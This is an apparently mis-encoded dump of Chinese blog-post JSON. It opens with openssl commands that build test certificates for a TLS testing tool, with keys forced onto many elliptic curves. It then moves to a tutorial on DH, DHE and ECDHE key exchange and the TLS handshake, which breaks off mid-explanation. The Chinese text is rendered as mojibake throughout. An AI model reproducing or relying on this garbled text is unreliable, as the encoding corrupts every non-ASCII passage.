ä½¿ç”¨ rsa2048_key.pem ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ rsa.csr openssl req -new -key rsa2048_key.pem -out rsa.csr -subj \"/CN=tls-attacker.com\" openssl x509 -req -in rsa.csr -CAkey rsa2048_key.pem -CA rsa_ca.pem -force_pubkey dhpubkey.pem -outrsa_dhcert.pem -CAcreateserial openssl req -new -key dsa1024_key.pem -out dsa.csr -subj \"/CN=tls-attacker.com\" openssl x509 -req -in dsa.csr -CAkey dsa1024_key.pem -CA dsa_ca.pem -force_pubkey dhpubkey.pem -out dsa_dhcert.pem -CAcreateserial for named_curve in secp160k1 secp160r1 secp160r2 secp192k1 secp224k1 secp224r1 secp256k1 secp384r1 secp521r1 sect163k1 sect163r1 sect163r2 sect193r1 sect193r2 sect233k1 sect233r1 sect239k1 sect283k1 sect283r1 sect409k1 sect409r1 sect571k1 sect571r1 do openssl ecparam -out ec_param_$&#123;named_curve&#125;.pem -name $&#123;named_curve&#125; openssl genpkey -paramfile ec_param_$&#123;named_curve&#125;.pem -out ec_rsa_private_key_$&#123;named_curve&#125;.pem openssl pkey -in ec_rsa_private_key_$&#123;named_curve&#125;.pem -pubout -out ec_rsa_public_key_$&#123;named_curve&#125;.pem openssl x509 -req -in rsa.csr -CAkey rsa2048_key.pem -CA rsa_ca.pem -force_pubkey ec_rsa_public_key_$&#123;named_curve&#125;.pem -out ec_rsa_cert_$&#123;named_curve&#125;.pem -CAcreateserial done","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"SSL","slug":"æŠ€æœ¯å‘/SSL","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/SSL/"}],"tags":[{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://www.sizaif.com/tags/OpenSSL/"}],"author":"sizaif"},{"title":"å›¾è§£ECDHEå¯†é’¥äº¤æ¢ç®—æ³•","slug":"å›¾è§£ECDHEå¯†é’¥äº¤æ¢ç®—æ³•","date":"2022-07-18T14:09:40.000Z","updated":"2022-11-07T04:30:55.000Z","comments":true,"path":"posts/1bc7b49d/","link":"","permalink":"https://www.sizaif.com/posts/1bc7b49d/","excerpt":"","text":"å›¾è§£ ECDHE å¯†é’¥äº¤æ¢ç®—æ³• HTTPS å¸¸ç”¨çš„å¯†é’¥äº¤æ¢ç®—æ³•æœ‰ä¸¤ç§ï¼Œåˆ†åˆ«æ˜¯ RSA å’Œ ECDHE ç®—æ³•ã€‚ å…¶ä¸­ï¼ŒRSA æ˜¯æ¯”è¾ƒä¼ ç»Ÿçš„å¯†é’¥äº¤æ¢ç®—æ³•ï¼Œå®ƒä¸å…·å¤‡å‰å‘å®‰å…¨çš„æ€§è´¨ï¼Œå› æ­¤ç°åœ¨å¾ˆå°‘æœåŠ¡å™¨ä½¿ç”¨çš„ã€‚è€Œ ECDHE ç®—æ³•å…·æœ‰å‰å‘å®‰å…¨ï¼Œæ‰€ä»¥è¢«å¹¿æ³›ä½¿ç”¨ã€‚ ä»Šå¤©è¿™ä¸€ç¯‡ã€Œä»ç†è®ºå†åˆ°å®æˆ˜æŠ“åŒ…ã€ä»‹ç» ECDHE ç®—æ³•ã€‚ ç¦»æ•£å¯¹æ•° ECDHE å¯†é’¥åå•†ç®—æ³•æ˜¯ DH ç®—æ³•æ¼”è¿›è¿‡æ¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆä» DH ç®—æ³•è¯´èµ·ã€‚ DH ç®—æ³•æ˜¯éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œ å› æ­¤å®ƒå¯ä»¥ç”¨äºå¯†é’¥äº¤æ¢ï¼Œè¯¥ç®—æ³•çš„æ ¸å¿ƒæ•°å­¦æ€æƒ³æ˜¯ç¦»æ•£å¯¹æ•°ã€‚ æ˜¯ä¸æ˜¯å¬åˆ°è¿™ä¸ªæ•°å­¦æ¦‚å¿µå°±æ€‚äº†ï¼Ÿä¸æ€•ï¼Œè¿™æ¬¡ä¸ä¼šè¯´ç¦»æ•£å¯¹æ•°æ¨åˆ°çš„è¿‡ç¨‹ï¼Œåªç®€å•æä¸€ä¸‹å®ƒçš„æ•°å­¦å…¬å¼ã€‚ ç¦»æ•£å¯¹æ•°æ˜¯ã€Œç¦»æ•£ + å¯¹æ•°ã€çš„ä¸¤ä¸ªæ•°å­¦æ¦‚å¿µçš„ç»„åˆï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæ¥å¤ä¹ ä¸€éå¯¹æ•°ã€‚ è¦è¯´èµ·å¯¹æ•°ï¼Œå¿…ç„¶è¦è¯´æŒ‡æ•°ï¼Œå› ä¸ºå®ƒä»¬æ˜¯äº’ä¸ºåå‡½æ•°ï¼ŒæŒ‡æ•°å°±æ˜¯å¹‚è¿ç®—ï¼Œå¯¹æ•°æ˜¯æŒ‡æ•°çš„é€†è¿ç®—ã€‚ ä¸¾ä¸ªæ —å­ï¼Œå¦‚æœä»¥ 2 ä½œä¸ºåº•æ•°ï¼Œé‚£ä¹ˆæŒ‡æ•°å’Œå¯¹æ•°è¿ç®—å…¬å¼ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š é‚£ä¹ˆå¯¹äºåº•æ•°ä¸º 2 çš„æ—¶å€™ï¼Œ 32 çš„å¯¹æ•°æ˜¯ 5ï¼Œ64 çš„å¯¹æ•°æ˜¯ 6ï¼Œè®¡ç®—è¿‡ç¨‹å¦‚ä¸‹ï¼š å¯¹æ•°è¿ç®—çš„å–å€¼æ˜¯å¯ä»¥è¿ç»­çš„ï¼Œè€Œç¦»æ•£å¯¹æ•°çš„å–å€¼æ˜¯ä¸èƒ½è¿ç»­çš„ï¼Œå› æ­¤ä¹Ÿä»¥ã€Œç¦»æ•£ã€å¾—åï¼Œ ç¦»æ•£å¯¹æ•°æ˜¯åœ¨å¯¹æ•°è¿ç®—çš„åŸºç¡€ä¸ŠåŠ äº†ã€Œæ¨¡è¿ç®—ã€ï¼Œä¹Ÿå°±è¯´å–ä½™æ•°ï¼Œå¯¹åº”ç¼–ç¨‹è¯­è¨€çš„æ“ä½œç¬¦æ˜¯ã€Œ%ã€ï¼Œä¹Ÿå¯ä»¥ç”¨ mod è¡¨ç¤ºã€‚ç¦»æ•£å¯¹æ•°çš„æ¦‚å¿µå¦‚ä¸‹å›¾ï¼š ä¸Šå›¾çš„ï¼Œåº•æ•° a å’Œæ¨¡æ•° p æ˜¯ç¦»æ•£å¯¹æ•°çš„å…¬å…±å‚æ•°ï¼Œä¹Ÿå°±è¯´æ˜¯å…¬å¼€çš„ï¼Œb æ˜¯çœŸæ•°ï¼Œi æ˜¯å¯¹æ•°ã€‚çŸ¥é“äº†å¯¹æ•°ï¼Œå°±å¯ä»¥ç”¨ä¸Šé¢çš„å…¬å¼è®¡ç®—å‡ºçœŸæ•°ã€‚ä½†åè¿‡æ¥ï¼ŒçŸ¥é“çœŸæ•°å´å¾ˆéš¾æ¨ç®—å‡ºå¯¹æ•°ã€‚ ç‰¹åˆ«æ˜¯å½“æ¨¡æ•° p æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„è´¨æ•°ï¼Œå³ä½¿çŸ¥é“åº•æ•° a å’ŒçœŸæ•° b ï¼Œåœ¨ç°æœ‰çš„è®¡ç®—æœºçš„è®¡ç®—æ°´å¹³æ˜¯å‡ ä¹æ— æ³•ç®—å‡ºç¦»æ•£å¯¹æ•°çš„ï¼Œè¿™å°±æ˜¯ DH ç®—æ³•çš„æ•°å­¦åŸºç¡€ã€‚ DH ç®—æ³• è®¤è¯†äº†ç¦»æ•£å¯¹æ•°ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ DH ç®—æ³•æ˜¯å¦‚ä½•å¯†é’¥äº¤æ¢çš„ã€‚ ç°å‡è®¾å°çº¢å’Œå°æ˜çº¦å®šä½¿ç”¨ DH ç®—æ³•æ¥äº¤æ¢å¯†é’¥ï¼Œé‚£ä¹ˆåŸºäºç¦»æ•£å¯¹æ•°ï¼Œå°çº¢å’Œå°æ˜éœ€è¦å…ˆç¡®å®šæ¨¡æ•°å’Œåº•æ•°ä½œä¸ºç®—æ³•çš„å‚æ•°ï¼Œè¿™ä¸¤ä¸ªå‚æ•°æ˜¯å…¬å¼€çš„ï¼Œç”¨ P å’Œ G æ¥ä»£ç§°ã€‚ ç„¶åå°çº¢å’Œå°æ˜å„è‡ªç”Ÿæˆä¸€ä¸ªéšæœºæ•´æ•°ä½œä¸ºç§é’¥ï¼ŒåŒæ–¹çš„ç§é’¥è¦å„è‡ªä¸¥æ ¼ä¿ç®¡ï¼Œä¸èƒ½æ³„æ¼ï¼Œå°çº¢çš„ç§é’¥ç”¨ a ä»£ç§°ï¼Œå°æ˜çš„ç§é’¥ç”¨ b ä»£ç§°ã€‚ ç°åœ¨å°çº¢å’Œå°æ˜åŒæ–¹éƒ½æœ‰äº† P å’Œ G ä»¥åŠå„è‡ªçš„ç§é’¥ï¼Œäºæ˜¯å°±å¯ä»¥è®¡ç®—å‡ºå…¬é’¥ï¼š å°çº¢çš„å…¬é’¥è®°ä½œ Aï¼ŒA = G ^ a ( mod P )ï¼› å°æ˜çš„å…¬é’¥è®°ä½œ Bï¼ŒB = G ^ b ( mod P )ï¼› A å’Œ B ä¹Ÿæ˜¯å…¬å¼€çš„ï¼Œå› ä¸ºæ ¹æ®ç¦»æ•£å¯¹æ•°çš„åŸç†ï¼Œä»çœŸæ•°ï¼ˆA å’Œ Bï¼‰åå‘è®¡ç®—å¯¹æ•° a å’Œ b æ˜¯éå¸¸å›°éš¾çš„ï¼Œè‡³å°‘åœ¨ç°æœ‰è®¡ç®—æœºçš„è®¡ç®—èƒ½åŠ›æ˜¯æ— æ³•ç ´è§£çš„ï¼Œå¦‚æœé‡å­è®¡ç®—æœºå‡ºæ¥äº†ï¼Œé‚£å°±æœ‰å¯èƒ½è¢«ç ´è§£ï¼Œå½“ç„¶å¦‚æœé‡å­è®¡ç®—æœºçœŸçš„å‡ºæ¥äº†ï¼Œé‚£ä¹ˆå¯†é’¥åå•†ç®—æ³•å°±è¦åšå¤§çš„å‡çº§äº†ã€‚ åŒæ–¹äº¤æ¢å„è‡ª DH å…¬é’¥åï¼Œå°çº¢æ‰‹ä¸Šå…±æœ‰ 5 ä¸ªæ•°ï¼šPã€Gã€aã€Aã€Bï¼Œå°æ˜æ‰‹ä¸Šä¹ŸåŒæ ·å…±æœ‰ 5 ä¸ªæ•°ï¼šPã€Gã€bã€Bã€Aã€‚ ç„¶åå°çº¢æ‰§è¡Œè¿ç®—ï¼š B ^ a ( mod P )ï¼Œå…¶ç»“æœä¸º Kï¼Œå› ä¸ºç¦»æ•£å¯¹æ•°çš„å¹‚è¿ç®—æœ‰äº¤æ¢å¾‹ï¼Œæ‰€ä»¥å°æ˜æ‰§è¡Œè¿ç®—ï¼š A ^ b ( mod P )ï¼Œå¾—åˆ°çš„ç»“æœä¹Ÿæ˜¯ Kã€‚ è¿™ä¸ª K å°±æ˜¯å°çº¢å’Œå°æ˜ä¹‹é—´ç”¨çš„å¯¹ç§°åŠ å¯†å¯†é’¥ï¼Œå¯ä»¥ä½œä¸ºä¼šè¯å¯†é’¥ä½¿ç”¨ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œæ•´ä¸ªå¯†é’¥åå•†è¿‡ç¨‹ä¸­ï¼Œå°çº¢å’Œå°æ˜å…¬å¼€äº† 4 ä¸ªä¿¡æ¯ï¼šPã€Gã€Aã€Bï¼Œå…¶ä¸­ Pã€G æ˜¯ç®—æ³•çš„å‚æ•°ï¼ŒA å’Œ B æ˜¯å…¬é’¥ï¼Œè€Œ aã€b æ˜¯åŒæ–¹å„è‡ªä¿ç®¡çš„ç§é’¥ï¼Œé»‘å®¢æ— æ³•è·å–è¿™ 2 ä¸ªç§é’¥ï¼Œå› æ­¤é»‘å®¢åªèƒ½ä»å…¬å¼€çš„ Pã€Gã€Aã€B å…¥æ‰‹ï¼Œè®¡ç®—å‡ºç¦»æ•£å¯¹æ•°ï¼ˆç§é’¥ï¼‰ã€‚ å‰é¢ä¹Ÿå¤šæ¬¡å¼ºè°ƒï¼Œ æ ¹æ®ç¦»æ•£å¯¹æ•°çš„åŸç†ï¼Œå¦‚æœ P æ˜¯ä¸€ä¸ªå¤§æ•°ï¼Œåœ¨ç°æœ‰çš„è®¡ç®—æœºçš„è®¡ç®—èƒ½åŠ›æ˜¯å¾ˆéš¾ç ´è§£å‡º ç§é’¥ aã€b çš„ï¼Œç ´è§£ä¸å‡ºç§é’¥ï¼Œä¹Ÿå°±æ— æ³•è®¡ç®—å‡ºä¼šè¯å¯†é’¥ï¼Œå› æ­¤ DH å¯†é’¥äº¤æ¢æ˜¯å®‰å…¨çš„ã€‚ DHE ç®—æ³• æ ¹æ®ç§é’¥ç”Ÿæˆçš„æ–¹å¼ï¼ŒDH ç®—æ³•åˆ†ä¸ºä¸¤ç§å®ç°ï¼š static DH ç®—æ³•ï¼Œè¿™ä¸ªæ˜¯å·²ç»è¢«åºŸå¼ƒäº†ï¼› DHE ç®—æ³•ï¼Œç°åœ¨å¸¸ç”¨çš„ï¼› static DH ç®—æ³•é‡Œæœ‰ä¸€æ–¹çš„ç§é’¥æ˜¯é™æ€çš„ï¼Œä¹Ÿå°±è¯´æ¯æ¬¡å¯†é’¥åå•†çš„æ—¶å€™æœ‰ä¸€æ–¹çš„ç§é’¥éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¸€èˆ¬æ˜¯æœåŠ¡å™¨æ–¹å›ºå®šï¼Œå³ a ä¸å˜ï¼Œå®¢æˆ·ç«¯çš„ç§é’¥åˆ™æ˜¯éšæœºç”Ÿæˆçš„ã€‚ äºæ˜¯ï¼ŒDH äº¤æ¢å¯†é’¥æ—¶å°±åªæœ‰å®¢æˆ·ç«¯çš„å…¬é’¥æ˜¯å˜åŒ–ï¼Œè€ŒæœåŠ¡ç«¯å…¬é’¥æ˜¯ä¸å˜çš„ï¼Œé‚£ä¹ˆéšç€æ—¶é—´å»¶é•¿ï¼Œé»‘å®¢å°±ä¼šæˆªè·æµ·é‡çš„å¯†é’¥åå•†è¿‡ç¨‹çš„æ•°æ®ï¼Œå› ä¸ºå¯†é’¥åå•†çš„è¿‡ç¨‹æœ‰äº›æ•°æ®æ˜¯å…¬å¼€çš„ï¼Œé»‘å®¢å°±å¯ä»¥ä¾æ®è¿™äº›æ•°æ®æš´åŠ›ç ´è§£å‡ºæœåŠ¡å™¨çš„ç§é’¥ï¼Œç„¶åå°±å¯ä»¥è®¡ç®—å‡ºä¼šè¯å¯†é’¥äº†ï¼Œäºæ˜¯ä¹‹å‰æˆªè·çš„åŠ å¯†æ•°æ®ä¼šè¢«ç ´è§£ï¼Œæ‰€ä»¥ static DH ç®—æ³•ä¸å…·å¤‡å‰å‘å®‰å…¨æ€§ã€‚ æ—¢ç„¶å›ºå®šä¸€æ–¹çš„ç§é’¥æœ‰è¢«ç ´è§£çš„é£é™©ï¼Œé‚£ä¹ˆå¹²è„†å°±è®©åŒæ–¹çš„ç§é’¥åœ¨æ¯æ¬¡å¯†é’¥äº¤æ¢é€šä¿¡æ—¶ï¼Œéƒ½æ˜¯éšæœºç”Ÿæˆçš„ã€ä¸´æ—¶çš„ï¼Œè¿™ä¸ªæ–¹å¼ä¹Ÿå°±æ˜¯ DHE ç®—æ³•ï¼ŒE å…¨ç§°æ˜¯ ephemeralï¼ˆä¸´æ—¶æ€§çš„ï¼‰ã€‚ æ‰€ä»¥ï¼Œå³ä½¿æœ‰ä¸ªç‰›é€¼çš„é»‘å®¢ç ´è§£äº†æŸä¸€æ¬¡é€šä¿¡è¿‡ç¨‹çš„ç§é’¥ï¼Œå…¶ä»–é€šä¿¡è¿‡ç¨‹çš„ç§é’¥ä»ç„¶æ˜¯å®‰å…¨çš„ï¼Œå› ä¸ºæ¯ä¸ªé€šä¿¡è¿‡ç¨‹çš„ç§é’¥éƒ½æ˜¯æ²¡æœ‰ä»»ä½•å…³ç³»çš„ï¼Œéƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œè¿™æ ·å°±ä¿è¯äº†ã€Œå‰å‘å®‰å…¨ã€ã€‚ ECDHE ç®—æ³• DHE ç®—æ³•ç”±äºè®¡ç®—æ€§èƒ½ä¸ä½³ï¼Œå› ä¸ºéœ€è¦åšå¤§é‡çš„ä¹˜æ³•ï¼Œä¸ºäº†æå‡ DHE ç®—æ³•çš„æ€§èƒ½ï¼Œæ‰€ä»¥å°±å‡ºç°äº†ç°åœ¨å¹¿æ³›ç”¨äºå¯†é’¥äº¤æ¢ç®—æ³• â€”â€” ECDHE ç®—æ³•ã€‚ ECDHE ç®—æ³•æ˜¯åœ¨ DHE ç®—æ³•çš„åŸºç¡€ä¸Šåˆ©ç”¨äº† ECC æ¤­åœ†æ›²çº¿ç‰¹æ€§ï¼Œå¯ä»¥ç”¨æ›´å°‘çš„è®¡ç®—é‡è®¡ç®—å‡ºå…¬é’¥ï¼Œä»¥åŠæœ€ç»ˆçš„ä¼šè¯å¯†é’¥ã€‚ å°çº¢å’Œå°æ˜ä½¿ç”¨ ECDHE å¯†é’¥äº¤æ¢ç®—æ³•çš„è¿‡ç¨‹ï¼š åŒæ–¹äº‹å…ˆç¡®å®šå¥½ä½¿ç”¨å“ªç§æ¤­åœ†æ›²çº¿ï¼Œå’Œæ›²çº¿ä¸Šçš„åŸºç‚¹ Gï¼Œè¿™ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯å…¬å¼€çš„ï¼› åŒæ–¹å„è‡ªéšæœºç”Ÿæˆä¸€ä¸ªéšæœºæ•°ä½œä¸ºç§é’¥dï¼Œå¹¶ä¸åŸºç‚¹ Gç›¸ä¹˜å¾—åˆ°å…¬é’¥Qï¼ˆQ = dGï¼‰ï¼Œæ­¤æ—¶å°çº¢çš„å…¬ç§é’¥ä¸º Q1 å’Œ d1ï¼Œå°æ˜çš„å…¬ç§é’¥ä¸º Q2 å’Œ d2ï¼› åŒæ–¹äº¤æ¢å„è‡ªçš„å…¬é’¥ï¼Œæœ€åå°çº¢è®¡ç®—ç‚¹ï¼ˆx1ï¼Œy1ï¼‰ = d1Q2ï¼Œå°æ˜è®¡ç®—ç‚¹ï¼ˆx2ï¼Œy2ï¼‰ = d2Q1ï¼Œç”±äºæ¤­åœ†æ›²çº¿ä¸Šæ˜¯å¯ä»¥æ»¡è¶³ä¹˜æ³•äº¤æ¢å’Œç»“åˆå¾‹ï¼Œæ‰€ä»¥ d1Q2 = d1d2G = d2d1G = d2Q1 ï¼Œå› æ­¤åŒæ–¹çš„ x åæ ‡æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥å®ƒæ˜¯å…±äº«å¯†é’¥ï¼Œä¹Ÿå°±æ˜¯ä¼šè¯å¯†é’¥ã€‚ è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼ŒåŒæ–¹çš„ç§é’¥éƒ½æ˜¯éšæœºã€ä¸´æ—¶ç”Ÿæˆçš„ï¼Œéƒ½æ˜¯ä¸å…¬å¼€çš„ï¼Œå³ä½¿æ ¹æ®å…¬å¼€çš„ä¿¡æ¯ï¼ˆæ¤­åœ†æ›²çº¿ã€å…¬é’¥ã€åŸºç‚¹ Gï¼‰ä¹Ÿæ˜¯å¾ˆéš¾è®¡ç®—å‡ºæ¤­åœ†æ›²çº¿ä¸Šçš„ç¦»æ•£å¯¹æ•°ï¼ˆç§é’¥ï¼‰ã€‚ ECDHE æ¡æ‰‹è¿‡ç¨‹ çŸ¥é“äº† ECDHE ç®—æ³•åŸºæœ¬åŸç†åï¼Œæˆ‘ä»¬å°±ç»“åˆå®é™…çš„æƒ…å†µæ¥çœ‹çœ‹ã€‚ æˆ‘ç”¨ Wireshark å·¥å…·æŠ“äº†ç”¨ ECDHE å¯†é’¥åå•†ç®—æ³•çš„ TSL æ¡æ‰‹è¿‡ç¨‹ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯å››æ¬¡æ¡æ‰‹ï¼š ç»†å¿ƒçš„å°ä¼™ä¼´åº”è¯¥å‘ç°äº†ï¼Œä½¿ç”¨äº† ECDHEï¼Œåœ¨ TLS ç¬¬å››æ¬¡æ¡æ‰‹å‰ï¼Œå®¢æˆ·ç«¯å°±å·²ç»å‘é€äº†åŠ å¯†çš„ HTTP æ•°æ®ï¼Œè€Œå¯¹äº RSA æ¡æ‰‹è¿‡ç¨‹ï¼Œå¿…é¡»è¦å®Œæˆ TLS å››æ¬¡æ¡æ‰‹ï¼Œæ‰èƒ½ä¼ è¾“åº”ç”¨æ•°æ®ã€‚ æ‰€ä»¥ï¼ŒECDHE ç›¸æ¯” RSA æ¡æ‰‹è¿‡ç¨‹çœå»äº†ä¸€ä¸ªæ¶ˆæ¯å¾€è¿”çš„æ—¶é—´ï¼Œè¿™ä¸ªæœ‰ç‚¹ã€ŒæŠ¢è·‘ã€çš„æ„æ€ï¼Œå®ƒè¢«ç§°ä¸ºæ˜¯ã€ŒTLS False Startã€ï¼Œè·Ÿã€ŒTCP Fast Openã€æœ‰ç‚¹åƒï¼Œéƒ½æ˜¯åœ¨è¿˜æ²¡è¿æ¥å®Œå…¨å»ºç«‹å‰ï¼Œå°±å‘é€äº†åº”ç”¨æ•°æ®ï¼Œè¿™æ ·ä¾¿æé«˜äº†ä¼ è¾“çš„æ•ˆç‡ã€‚ æ¥ä¸‹æ¥ï¼Œåˆ†ææ¯ä¸€ä¸ª ECDHE æ¡æ‰‹è¿‡ç¨‹ã€‚ TLS ç¬¬ä¸€æ¬¡æ¡æ‰‹ å®¢æˆ·ç«¯é¦–å…ˆä¼šå‘ä¸€ä¸ªã€ŒClient Helloã€æ¶ˆæ¯ï¼Œæ¶ˆæ¯é‡Œé¢æœ‰å®¢æˆ·ç«¯ä½¿ç”¨çš„ TLS ç‰ˆæœ¬å·ã€æ”¯æŒçš„å¯†ç å¥—ä»¶åˆ—è¡¨ï¼Œä»¥åŠç”Ÿæˆçš„éšæœºæ•°ï¼ˆClient Randomï¼‰ã€‚ TLS ç¬¬äºŒæ¬¡æ¡æ‰‹ æœåŠ¡ç«¯æ”¶åˆ°å®¢æˆ·ç«¯çš„ã€Œæ‰“æ‹›å‘¼ã€ï¼ŒåŒæ ·ä¹Ÿè¦å›ç¤¼ï¼Œä¼šè¿”å›ã€ŒServer Helloã€æ¶ˆæ¯ï¼Œæ¶ˆæ¯é¢æœ‰æœåŠ¡å™¨ç¡®è®¤çš„ TLS ç‰ˆæœ¬å·ï¼Œä¹Ÿç»™å‡ºäº†ä¸€ä¸ªéšæœºæ•°ï¼ˆServer Randomï¼‰ï¼Œç„¶åä»å®¢æˆ·ç«¯çš„å¯†ç å¥—ä»¶åˆ—è¡¨é€‰æ‹©äº†ä¸€ä¸ªåˆé€‚çš„å¯†ç å¥—ä»¶ã€‚ ä¸è¿‡ï¼Œè¿™æ¬¡é€‰æ‹©çš„å¯†ç å¥—ä»¶å°±å’Œ RSA ä¸ä¸€æ ·äº†ï¼Œæˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹è¿™æ¬¡çš„å¯†ç å¥—ä»¶çš„æ„æ€ã€‚ ã€Œ TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384ã€ å¯†é’¥åå•†ç®—æ³•ä½¿ç”¨ ECDHEï¼› ç­¾åç®—æ³•ä½¿ç”¨ RSAï¼› æ¡æ‰‹åçš„é€šä¿¡ä½¿ç”¨ AES å¯¹ç§°ç®—æ³•ï¼Œå¯†é’¥é•¿åº¦ 256 ä½ï¼Œåˆ†ç»„æ¨¡å¼æ˜¯ GCMï¼› æ‘˜è¦ç®—æ³•ä½¿ç”¨ SHA384ï¼› æ¥ç€ï¼ŒæœåŠ¡ç«¯ä¸ºäº†è¯æ˜è‡ªå·±çš„èº«ä»½ï¼Œå‘é€ã€ŒCertificateã€æ¶ˆæ¯ï¼Œä¼šæŠŠè¯ä¹¦ä¹Ÿå‘ç»™å®¢æˆ·ç«¯ã€‚ è¿™ä¸€æ­¥å°±å’Œ RSA æ¡æ‰‹è¿‡ç¨‹æœ‰å¾ˆå¤§åˆ°åŒºåˆ«äº†ï¼Œå› ä¸ºæœåŠ¡ç«¯é€‰æ‹©äº† ECDHE å¯†é’¥åå•†ç®—æ³•ï¼Œæ‰€ä»¥ä¼šåœ¨å‘é€å®Œè¯ä¹¦åï¼Œå‘é€ã€ŒServer Key Exchangeã€æ¶ˆæ¯ã€‚ è¿™ä¸ªè¿‡ç¨‹æœåŠ¡å™¨åšäº†ä¸‰ä»¶äº‹ï¼š é€‰æ‹©äº†åä¸º named_curve çš„æ¤­åœ†æ›²çº¿ï¼Œé€‰å¥½äº†æ¤­åœ†æ›²çº¿ç›¸å½“äºæ¤­åœ†æ›²çº¿åŸºç‚¹ G ä¹Ÿå®šå¥½äº†ï¼Œè¿™äº›éƒ½ä¼šå…¬å¼€ç»™å®¢æˆ·ç«¯ï¼› ç”Ÿæˆéšæœºæ•°ä½œä¸ºæœåŠ¡ç«¯æ¤­åœ†æ›²çº¿çš„ç§é’¥ï¼Œä¿ç•™åˆ°æœ¬åœ°ï¼› æ ¹æ®åŸºç‚¹ G å’Œç§é’¥è®¡ç®—å‡ºæœåŠ¡ç«¯çš„æ¤­åœ†æ›²çº¿å…¬é’¥ï¼Œè¿™ä¸ªä¼šå…¬å¼€ç»™å®¢æˆ·ç«¯ã€‚ ä¸ºäº†ä¿è¯è¿™ä¸ªæ¤­åœ†æ›²çº¿çš„å…¬é’¥ä¸è¢«ç¬¬ä¸‰æ–¹ç¯¡æ”¹ï¼ŒæœåŠ¡ç«¯ä¼šç”¨ RSA ç­¾åç®—æ³•ç»™æœåŠ¡ç«¯çš„æ¤­åœ†æ›²çº¿å…¬é’¥åšä¸ªç­¾åã€‚ éšåï¼Œå°±æ˜¯ã€ŒServer Hello Doneã€æ¶ˆæ¯ï¼ŒæœåŠ¡ç«¯è·Ÿå®¢æˆ·ç«¯è¡¨æ˜ï¼šâ€œè¿™äº›å°±æ˜¯æˆ‘æä¾›çš„ä¿¡æ¯ï¼Œæ‰“æ‹›å‘¼å®Œæ¯•â€ã€‚ è‡³æ­¤ï¼ŒTLS ä¸¤æ¬¡æ¡æ‰‹å°±å·²ç»å®Œæˆäº†ï¼Œç›®å‰å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯é€šè¿‡æ˜æ–‡å…±äº«äº†è¿™å‡ ä¸ªä¿¡æ¯ï¼šClient Randomã€Server Random ã€ä½¿ç”¨çš„æ¤­åœ†æ›²çº¿ã€æ¤­åœ†æ›²çº¿åŸºç‚¹ Gã€æœåŠ¡ç«¯æ¤­åœ†æ›²çº¿çš„å…¬é’¥ï¼Œè¿™å‡ ä¸ªä¿¡æ¯å¾ˆé‡è¦ï¼Œæ˜¯åç»­ç”Ÿæˆä¼šè¯å¯†é’¥çš„ææ–™ã€‚ TLS ç¬¬ä¸‰æ¬¡æ¡æ‰‹ å®¢æˆ·ç«¯æ”¶åˆ°äº†æœåŠ¡ç«¯çš„è¯ä¹¦åï¼Œè‡ªç„¶è¦æ ¡éªŒè¯ä¹¦æ˜¯å¦åˆæ³•ï¼Œå¦‚æœè¯ä¹¦åˆæ³•ï¼Œé‚£ä¹ˆæœåŠ¡ç«¯åˆ°èº«ä»½å°±æ˜¯æ²¡é—®é¢˜çš„ã€‚æ ¡éªŒè¯ä¹¦åˆ°è¿‡ç¨‹ï¼Œä¼šèµ°è¯ä¹¦é“¾é€çº§éªŒè¯ï¼Œç¡®è®¤è¯ä¹¦çš„çœŸå®æ€§ï¼Œå†ç”¨è¯ä¹¦çš„å…¬é’¥éªŒè¯ç­¾åï¼Œè¿™æ ·å°±èƒ½ç¡®è®¤æœåŠ¡ç«¯çš„èº«ä»½äº†ï¼Œç¡®è®¤æ— è¯¯åï¼Œå°±å¯ä»¥ç»§ç»­å¾€ä¸‹èµ°ã€‚ å®¢æˆ·ç«¯ä¼šç”Ÿæˆä¸€ä¸ªéšæœºæ•°ä½œä¸ºå®¢æˆ·ç«¯æ¤­åœ†æ›²çº¿çš„ç§é’¥ï¼Œç„¶åå†æ ¹æ®æœåŠ¡ç«¯å‰é¢ç»™çš„ä¿¡æ¯ï¼Œç”Ÿæˆå®¢æˆ·ç«¯çš„æ¤­åœ†æ›²çº¿å…¬é’¥ï¼Œç„¶åç”¨ã€ŒClient Key Exchangeã€æ¶ˆæ¯å‘ç»™æœåŠ¡ç«¯ã€‚ è‡³æ­¤ï¼ŒåŒæ–¹éƒ½æœ‰å¯¹æ–¹çš„æ¤­åœ†æ›²çº¿å…¬é’¥ã€è‡ªå·±çš„æ¤­åœ†æ›²çº¿ç§é’¥ã€æ¤­åœ†æ›²çº¿åŸºç‚¹ Gã€‚äºæ˜¯ï¼ŒåŒæ–¹éƒ½å°±è®¡ç®—å‡ºç‚¹ï¼ˆxï¼Œyï¼‰ï¼Œå…¶ä¸­ x åæ ‡å€¼åŒæ–¹éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå‰é¢è¯´ ECDHE ç®—æ³•æ—¶å€™ï¼Œè¯´ x æ˜¯ä¼šè¯å¯†é’¥ï¼Œä½†å®é™…åº”ç”¨ä¸­ï¼Œx è¿˜ä¸æ˜¯æœ€ç»ˆçš„ä¼šè¯å¯†é’¥ã€‚ è¿˜è®°å¾— TLS æ¡æ‰‹é˜¶æ®µï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½ä¼šç”Ÿæˆäº†ä¸€ä¸ªéšæœºæ•°ä¼ é€’ç»™å¯¹æ–¹å—ï¼Ÿ 